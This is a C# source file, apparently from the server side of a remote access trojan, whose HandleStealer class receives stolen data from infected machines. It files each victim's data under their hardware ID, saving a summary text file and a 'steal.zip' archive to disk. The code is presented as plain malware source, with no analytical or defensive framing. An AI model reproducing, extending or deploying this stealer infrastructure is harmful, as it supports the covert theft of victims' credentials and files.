using Server.Forms;
using Server.MessagePack;
using Server.Connection;
using System;
using System.Drawing;
using System.IO;
using System.Windows.Forms;
using System.Threading;
using System.Threading.Tasks;
using Server.Helper;
using System.Diagnostics;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.IO.Compression;

namespace Server.Handle_Packet
{
    public class HandleStealer
    {
        public static void RecursiveDelete(string path)
        {
            if (!Directory.Exists(path)) return;
            foreach(string subfile in Directory.GetFiles(path))
            {
                try { File.Delete(subfile); } catch { }
            }
            foreach (string subdir in Directory.GetDirectories(path))
                RecursiveDelete(subdir);
        }
        public void SaveData(Clients client, MsgPack unpack_msgpack)
        {
            try
            {
                client.ID = unpack_msgpack.ForcePathObject("Hwid").AsString;
                
                string fullPath = Path.Combine(Application.StartupPath, "ClientsFolder", unpack_msgpack.ForcePathObject("Hwid").AsString, "Steal");
                if (!Directory.Exists(fullPath)) Directory.CreateDirectory(fullPath);

                string filename = $"{fullPath}\\summary.txt";
                string info = unpack_msgpack.ForcePathObject("info").AsString;
                File.WriteAllText(filename, info);
                Process.Start("notepad.exe", filename);

                byte[] data = unpack_msgpack.ForcePathObject("zip").GetAsBytes();
                string zipfilename = $"{fullPath}\\steal.zip";
                if (File.Exists(zipfilename)) File.Delete(zipfilename);
                File.WriteAllBytes(zipfilename, data);
                new HandleLogs().Addmsg($"{client.Ip} Data is Saved!", Color.Blue);
            }
            catch (Exception ex)
            {
                new HandleLogs().Addmsg($"Save stealer file fail {ex.Message}", Color.Red);
            }
        }
    }
}
